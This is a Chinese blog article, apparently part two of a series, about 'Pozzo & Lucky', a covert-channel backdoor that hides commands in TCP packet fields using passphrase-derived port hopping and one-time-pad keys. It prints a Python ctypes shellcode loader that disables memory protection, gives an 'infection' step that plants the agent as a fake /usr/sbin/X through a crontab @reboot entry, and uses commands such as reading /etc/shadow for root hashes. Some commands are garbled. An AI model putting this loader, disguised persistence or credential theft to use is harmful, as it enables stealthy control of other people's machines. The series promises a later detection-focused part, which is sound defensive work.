源端口字段包含2个字节，即4个十六进制数字。 我们根据给定的通行字短语（它必须大于8——始终得到高端口）来初始化第一个（最高有效位）数字。
然后我们利用SHA512处理该通行字短语，从而得到哈希值的前3个十六进制数字。然后，将它们与最初的十六进制数字组成4个十六进制数字或2个字节。然后我们重复哈希计算过程，也就是通过重新计算其哈希值来生成下一个端口。
这种技术能够提供不同的端口号，对于没有通行字短语的人来说，这将是一个完全不可预测的序列。只有代理程序（Lucky）和客户端（Pozzo）知道下一个正确的通信端口，并且出现具有正确源端口的“噪音”数据包的可能性为1/65536，所以可以忽略不计。
**克服不一致的状态（或狗项圈）**
虽然出现噪音数据包的机会很渺茫，但是代理程序还是可能会接收到具有正确的源端口的噪音数据包（即并非由客户端Shell创建的数据包）。如果发生这种情况，代理将循环到下一个源端口，循环处理加密密钥，尝试对并没有包含隐写内容的数据包进行解密，并将其中的噪音数据当做要处理的内容，这样的话，就乱套了。
这时，局面就会完全失控，因为客户端对发生的密钥循环处理一无所知，因此将继续使用代理无法识别的密钥进行加密，并且从无法继续接收数据的代理源端口发出。
也就是说，我们将失去对肉鸡的远程控制能力。我们必须重新拿下它，并使用另外的漏洞利用代码投送工具。但是，请记住，Pozzo是靠狗项圈来控制Lucky的。他随时都能把他拽回来。
**狗项圈的实现**
当然，我们有一个安全机制可以防止这种悲剧。在OTP方案中，我们存储了一个不会参与循环的特殊控制密钥。此外，还有一个控制源端口，代理程序会接收来自该端口的数据包，并使用控制密钥将其解密。如果这种数据包中包含特殊的RST有效载荷，那么OTP密钥和源端口循环机制都会被重置。
这意味着，如果通信出现问题，可以从头开始，并且不会留下任何未加密的踪迹。
**长于5字节即为长有效载荷**
有些命令，如“find / -name”flag'2> / dev /
null”，其长度会超过单个数据包的5字节限制（+1字节的操作码），这些命令需要进行分块，并通过多个数据包传送，Lucky必须明白，“find”（注意空格
– 1个字节！）不是完整的命令，还必须等待下一个数据包的到达。
还有一种情况是“head -1
/etc/shadow”只能得到root密码的哈希值，这个命令产生一个大于等于100个字节的输出，并且必须将其传送回Pozzo。
而Pozzo必须知道什么时候需要等待更多的输出，什么时候整个有效载荷已经传输完成。此外，Lucky也从不发送那些数据包响应之外的数据包。
**协议中协议**
如果您可以使用操作码，那么您可以进行有状态的传输，这意味着您能知道何时需要等待更多的数据。有的操作码指示“还有更多的数据要传送，先不执行”，有些操作码表示“这个数据是命令的一部分”，有的操作码指出“这个数据是命令中的最后一个数据包，现在执行该命令”。它类似于TCP分组算法，只是无需使用数据偏移，因为无论是时间还是带宽方面，都不允许使用偏移量。OTP方案都可以确保，如果数据包发生丢失，那么后续的数据包就无法进行解密，因此不会出现部分执行的问题——状态不一致的问题就被解决了。
**Lucky的应答方式**
除非进行应答，否则Lucky从不发送数据包…这意味着它必须通知Pozzo想“谈谈”。然后，Pozzo开始发送随机数据（使用“谈谈”操作码），并且只能接受有意义的应答。Lucky还会声明什么时候需要结束谈话，然后就安静下来（直到下一个命令为止）。
**执行Shellcode结束Lucky**
传递shellcode后，在Linux中可以通过上面的ctypes代码片段来执行：
    libc = CDLL(‘libc.so.6’)# 加载 libc
    sc = c_char_p(shellcode)  # 利用shellcode生成一个C字符串
    size=len(shellcode) #计算shellcode的长度（后面会用到）
    addr=c_void_p(libc.valloc(size)) # 根据shellcode长度分配堆内存
    memmove(addr,sc size)#将shellcode从堆栈变量（指针）sc复制到刚刚分配的堆内存中
    libc.mprotect(addr, size, 0x7)# 禁用数据内存的NX保护
    run = cast(addr, CFUNCTYPE(c_void_p)) # 将指向堆中shellcode的指针转换为函数指针
    run()#运行shellcode
这里首先将其复制到堆内存中，解锁NX内存块的保护，并跳转到相应地址。这样，Lucky就会停止执行，因为EIP现在指向shellcode。Lucky将在shellcode终止时终止…
**变成独立进程！**
进行下列处理：
    p = Process(target=run)  #将shellcode作为独立进程p.start（）运行
而不是使用：
     run()
花了我半个小时的时间盯着屏幕…
在Windows中，也可以使用CreateThread（）。它甚至要更好一些，因为EIP在Windows中是无法跟踪的。在任何给定的时间，没有人可以跟踪EIP，即使其开发者也做不到。
**好戏开场了！**
**测试**
启动Lucky
    ＃Jlucfy.py mypcssphrase
Lucky启动之后，使用通行字短语来创建OTP，然后耐心等待…
**连接Pozzo**
    # Jpozzapy tai^eCjp mypossphrase
**实际感染**
    cp lucky.py/usr/sbirVX
    printf "@reboot/usr/sbin/X -rootless-noresetn" > /etc/crontab
记住，原来的X可执行文件位于/ usr /
bin目录…我个人不相信系统管理员会发觉这个进程是个冒牌货。即使乐观地估计，十个管理员中有四个看出来就不错了。如果你不是一个善于观察的人，则需要借助一些工具才能发现问题！
而这个Lucky实例的通行字短语是（是的，你猜到了！）“-rootless”(argv[1])。
你可以使用所有类似开关的通行字短语。我认为，没有谁了解所有的X开关…同时，也永远不会有人去阅读X的手册（页）！
（在这里，我们黑的不是电脑，而是人脑。恕我直言，Hacking无处不在。）
通行字短语也可以硬编码到lucky.py中，但是这种方法更容易被发现！此外，如果通行字短语作为参数传递的话，字符串命令将不会返回任何东西。这种方式很容易暴露。
**开启视频模式**
**OS Shell**
这里我在Pozzo＆Lucky中运行一些linux命令，同时用tcpdump嗅探。
视频链接
**Shellcode（ASM）Shell**
这里，我远程运行了网上找到的某shellcode。我第一次尝试投递shellcode时连接断开了，所以我重新启动了Pozzo强制重置数据包，之后就一切正常了。
视频链接
实验证明，终止shellcode后，再次使用操作系统shell时Lucky没有出问题。
视频模式关闭
**结束语**
目前这个项目是封闭的，因为它是一项尚未完成的个人研究的一部分。总的来说，整体想法具有一些学术性的观点，与"Embedding Covert Channels
into TCP/IP”(Murdoch & Lewis, 2005)等论文的观点相仿——我早就说过这个想法不是新的。
此外，任何人都可以将本文介绍的思路为基础，撰写自己的实现。当然，我的技术不是最好的，因为我相信有些事情还可以做得更好。我在编写Pozzo＆Lucky时学到了很多东西，希望大家不要错过这样的机会——不妨自己亲自动手编写自己的实现版本。此外，还有些事情（也许是很多事情！）要做，比如：
用ASM可编译语言（可能是C ++…）编写这样一个工具！ 这将是一个威力无比的工具，因为没有依赖关系（如果有的话可以随时使用 – – static）。
使用另一种协议。 ARP如何？ ARP是不会被拦截的，除非网络管理员是一个疯子，并已将所有交换机端口绑定到MAC。
即使出现这种情况，LAN中的所有人都可以收到Gratuitous ARP。我觉得这方面很有潜力。
根据上文中给出的伪代码提供其他实现。可以使用隐蔽通道过滤器。可以使用一个分类模型，来提供一个数据包是否包含隐写数据的可能性大小。我的意思是，为什么周围没有这样的东西？
我真的很想看到一个用于隐写术过滤的PF-Sense插件。
列表继续…
**还有第3篇吗？**
当然，谢谢关心！
第3篇将介绍针对这种技术的检测方法和防御措施。这将是一篇针对蓝队的文章！
目前，这种技术还有一些把手可能被抓住！
虽然TCP序列字段的熵与/ dev / urandom的熵具有相同数量字节，但是概率分布呢？
即使使用时间作为“种子”来创建ISN（由操作系统完成），它们也不是完全随机的。 这意味着它们不可避免地具有特定的分布状态。
Pozzo＆Lucky是否具有与ISN类似的分布呢？ 很可能不是。
**我们可以使用此信息确定数据包流是否包含隐写数据？**
**如果是，我们需要许多数据包（很多值来识别概率分布）。**
**具体多少？**
**在我们抓住坏蛋之前，会有多少数据已经被泄漏？**
下一篇会介绍函数和积分，以及防火墙和IDS日志等！更多精彩内容，敬请期待…
**传送门**
* * *
**[【技术分享】基于TCP/IP协议栈的隐写术和隐蔽通道（part
1）](http://bobao.360.cn/learning/detail/3754.html)**